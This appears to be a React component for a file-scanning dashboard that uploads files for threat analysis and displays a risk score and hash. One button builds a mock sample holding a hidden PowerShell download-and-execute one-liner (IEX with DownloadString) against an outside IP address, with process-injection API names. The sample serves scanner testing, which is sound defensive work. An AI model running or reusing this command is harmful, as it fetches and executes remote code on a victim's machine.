import React, { useState } from 'react';
import { analyzeFile } from '../services/fileAnalyzer';
import { FileAnalysisResult } from '../types/threat';
import { ExplainableAI } from './ExplainableAI';
import { Cpu, Upload } from 'lucide-react';

export const FileScanner: React.FC = () => {
  const [result, setResult] = useState<FileAnalysisResult | null>(null);

  const handleFileUpload = async (file: File) => {
    try {
      const res = await analyzeFile(file);
      setResult(res);
    } catch (err) {
      console.error(err);
    }
  };

  const handleCreateMockSample = () => {
    const mockName = 'payload_downloader.ps1';
    const mockContent = `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.4/beacon.ps1')"; VirtualAlloc; CreateRemoteThread`;
    const blob = new Blob([mockContent], { type: 'text/plain' });
    const mockFile = new File([blob], mockName, { type: 'text/plain' });
    handleFileUpload(mockFile);
  };

  return (
    <div className="space-y-6">
      <div className="glass-panel-glow rounded-xl p-6 text-center">
        <div className="flex items-center justify-center space-x-2 mb-3">
          <Cpu className="w-5 h-5 text-cyan-400" />
          <h2 className="text-sm font-mono font-bold text-slate-100 uppercase tracking-wide">
            STATIC FILE PAYLOAD & YARA ENTROPY INSPECTOR
          </h2>
        </div>

        <div className="border-2 border-dashed border-cyan-500/30 hover:border-cyan-400 bg-slate-900/60 rounded-xl p-8 transition-all flex flex-col items-center justify-center cursor-pointer relative">
          <Upload className="w-10 h-10 text-cyan-400 mb-3" />
          <p className="text-xs font-mono text-cyan-300 font-semibold mb-1">
            Drag & Drop File Here or Click to Browse
          </p>
          <input
            type="file"
            onChange={(e) => e.target.files?.[0] && handleFileUpload(e.target.files[0])}
            className="absolute opacity-0 w-full h-full cursor-pointer"
          />
        </div>

        <div className="mt-4 font-mono text-xs">
          <button
            onClick={handleCreateMockSample}
            className="px-3 py-1.5 rounded bg-pink-950/80 text-pink-300 border border-pink-500/40 hover:bg-pink-900/80 transition-all"
          >
            Load PowerShell Downloader Sample (Malicious)
          </button>
        </div>
      </div>

      {result && (
        <div className="space-y-6 font-mono text-xs">
          <div className={`rounded-xl p-6 border ${result.severity === 'CRITICAL' ? 'glass-panel-danger' : 'glass-panel-glow'}`}>
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
              <div className="space-y-3 flex-1">
                <div className="flex items-center space-x-3">
                  <span className={`px-3 py-1 font-bold rounded-full border ${
                    result.severity === 'CRITICAL' ? 'bg-pink-950 text-pink-300 border-pink-500' : 'bg-emerald-950 text-emerald-300 border-emerald-500'
                  }`}>
                    {result.severity} RISK FILE
                  </span>
                  <span className="text-slate-200 font-bold">{result.filename}</span>
                </div>

                <div className="p-3 bg-slate-900/90 rounded border border-slate-800">
                  <span className="text-slate-400 text-[10px] block">SHA-256 Hash:</span>
                  <code className="text-cyan-300 text-[11px] break-all">{result.sha256}</code>
                </div>
              </div>

              <div className="flex flex-col items-center justify-center p-4 bg-slate-900/90 rounded-xl border border-slate-800 shrink-0 min-w-[170px]">
                <span className="text-slate-400 mb-1">Payload Risk Score</span>
                <div className={`text-4xl font-extrabold ${result.riskScore >= 50 ? 'text-pink-400 text-danger-glow' : 'text-emerald-400'}`}>
                  {result.riskScore}<span className="text-sm font-normal text-slate-500">/100</span>
                </div>
              </div>
            </div>
          </div>

          <ExplainableAI features={result.xaiFeatures} overallScore={result.riskScore} />
        </div>
      )}
    </div>
  );
};
